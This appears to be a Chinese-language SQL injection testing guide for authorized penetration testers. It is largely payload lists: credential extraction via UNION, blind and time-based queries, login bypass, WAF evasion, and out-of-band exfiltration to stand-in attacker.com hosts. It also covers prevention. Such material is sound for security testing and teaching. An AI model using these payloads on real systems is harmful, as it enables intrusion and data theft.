# SQL注入测试

针对Web应用程序的全面SQL注入漏洞评估技术，涵盖检测、利用和防御验证。

## 适用场景

- 测试SQL注入漏洞  
- 执行授权渗透测试  
- 验证输入清理机制的有效性  
- 绕过身份验证以进行安全测试  
- 提取数据库信息（需授权）  
- 学习SQL注入防御方法  

## 不适用场景  

- 未经书面授权不得进行测试  
- 不得使用真实用户数据测试生产系统  
- 测试目的必须合法（切勿恶意使用）  

⚠️ **法律要求**：使用前必须获得书面渗透测试授权。  

---

## 检测阶段  

### 注入点识别  

常见的可注入参数：  
```
URL params:    ?id=1, ?user=admin, ?category=books
Form fields:   username, password, search, comments
Cookies:       session_id, user_preference
HTTP headers:  User-Agent, Referer, X-Forwarded-For
```  

### 基本漏洞测试  

```sql
-- Single quote test
'

-- Double quote test
"

-- Comment sequences
--
#
/**/

-- Semicolon for query stacking
;
```  

**需要注意的事项：**  
- 数据库错误信息  
- HTTP 500错误  
- 响应内容或长度的异常变化  
- 行为的意外变化  

### 布尔逻辑测试  

```sql
-- True condition (should return data)
page.asp?id=1 or 1=1
page.asp?id=1' or 1=1--
page.asp?id=1" or 1=1--

-- False condition (should return nothing/error)
page.asp?id=1 and 1=2
page.asp?id=1' and 1=2--
```  

通过比较响应结果（真/假）来确认是否发生注入。  

---

## 利用技术  

### 基于UNION的提取方法  

```sql
-- Step 1: Determine column count
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
-- Continue until error occurs

-- Step 2: Find displayable columns
UNION SELECT NULL,NULL,NULL--
UNION SELECT 'a',NULL,NULL--
UNION SELECT NULL,'a',NULL--

-- Step 3: Extract data
UNION SELECT username,password,NULL FROM users--
UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```  

### 基于错误的提取方法  

```sql
-- MSSQL
1' AND 1=CONVERT(int,(SELECT @@version))--

-- MySQL (XPATH)
1' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--

-- PostgreSQL
1' AND 1=CAST((SELECT version()) AS int)--
```  

### 盲目布尔逻辑测试  

```sql
-- Character extraction
1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b'--

-- Conditional responses
1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--
```  

### 基于时间的盲测方法  

```sql
-- MySQL
1' AND IF(1=1,SLEEP(5),0)--
1' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--

-- MSSQL
1'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
1'; SELECT pg_sleep(5)--
```  

### 超出范围（OOB）攻击  

```sql
-- MSSQL DNS exfiltration
1; EXEC master..xp_dirtree '\\attacker-server.com\share'--

-- MySQL DNS
1' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a'))--

-- Oracle HTTP
1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--
```  

---

## 绕过身份验证  

```sql
-- Classic bypass payloads
admin'--
admin'/*
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
') OR ('1'='1
') OR ('1'='1'--

-- Query transformation example
-- Original: SELECT * FROM users WHERE username='input' AND password='input'
-- Injected (username: admin'--):
-- SELECT * FROM users WHERE username='admin'--' AND password='anything'
-- Password check bypassed!
```  

---

## 过滤器绕过技术  

### 字符编码  

```sql
-- URL encoding
%27 (single quote)
%22 (double quote)
%23 (hash)

-- Double URL encoding
%2527 (single quote)

-- Hex strings (MySQL)
SELECT * FROM users WHERE name=0x61646D696E  -- 'admin'
```  

### 使用空格替代字符  

```sql
-- Comment substitution
SELECT/**/username/**/FROM/**/users

-- Tab character
SELECT%09username%09FROM%09users

-- Newline
SELECT%0Ausername%0AFROM%0Ausers
```  

### 规避关键词检测  

```sql
-- Case variation
SeLeCt, sElEcT, SELECT

-- Inline comments
SEL/*bypass*/ECT
UN/*bypass*/ION

-- Double writing (if filter removes once)
SELSELECTECT → SELECT
UNUNIONION → UNION
```  

---

## 数据库指纹识别  

| 数据库 | 查询语句 |  
|----------|-----------|  
| MySQL   | `SELECT @@version` 或 `SELECT version()` |  
| MSSQL   | `SELECT @@version` |  
| PostgreSQL | `SELECT version()` |  
| Oracle   | `SELECT banner FROM v$version` |  
| SQLite | `SELECT sqlite_version()` |  

---

## 信息架构查询  

```sql
-- MySQL/MSSQL: List tables
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

-- List columns
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Oracle equivalent
SELECT table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
```  

---

## 快速参考  

| 目的        | 载荷         |  
|------------|-------------|  
| 基本测试      | `'` 或 `"`       |  
| 布尔值为真     | `OR 1=1--`     |  
| 布尔值为假     | `AND 1=2--`     |  
| MySQL注释     | `#` 或 `--`      |  
| MSSQL注释     | `--`      |  
| UNION探测     | `UNION SELECT NULL--`   |  
| 延迟操作     | `AND SLEEP(5)--`    |  
| 绕过身份验证 | `' OR '1'='1'`    |  

---

## 检测测试流程  

```
1. Insert ' → Check for error
2. Insert " → Check for error
3. Try: OR 1=1-- → Check for behavior change
4. Try: AND 1=2-- → Check for behavior change
5. Try: ' WAITFOR DELAY '0:0:5'-- → Check for delay
```  

---

## 预防措施（代码审查时需注意的内容）  

### ❌ 易受攻击的代码示例  

```javascript
const query = `SELECT * FROM users WHERE id = '${userId}'`;
```  

### ✅ 安全的代码示例  

```javascript
// Parameterized query
const query = 'SELECT * FROM users WHERE id = $1';
const result = await db.query(query, [userId]);

// OR use ORM
const user = await prisma.user.findUnique({ where: { id: userId } });
```  

---

## 工具推荐  

- **SQLMap**：自动化的SQL注入测试工具  
- **Burp Suite**：请求操控工具  
- **OWASP ZAP**：Web应用扫描器  
- **Havij**：SQL注入测试工具  

---

## 故障排除  

| 问题        | 解决方案        |  
|------------|----------------|  
| 无错误信息     | 使用盲测方法（布尔逻辑/基于时间的测试） |  
| UNION操作失败     | 使用`ORDER BY`检查列数       |  
| WAF阻止攻击     | 使用编码/规避技术         |  
| 载荷无法执行     | 核对正确的注释语法（根据数据库类型） |  
| 基于时间的延迟不一致 | 增加延迟时间（10秒以上）     |  

---

## 伦理准则  

- 未经明确授权，严禁执行破坏性操作（如`DROP`、`DELETE`）  
- 仅提取用于概念验证的数据量  
- 一旦检测到生产系统数据，立即停止测试  
- 通过指定渠道报告关键漏洞  
- 记录所有操作以备审计  

---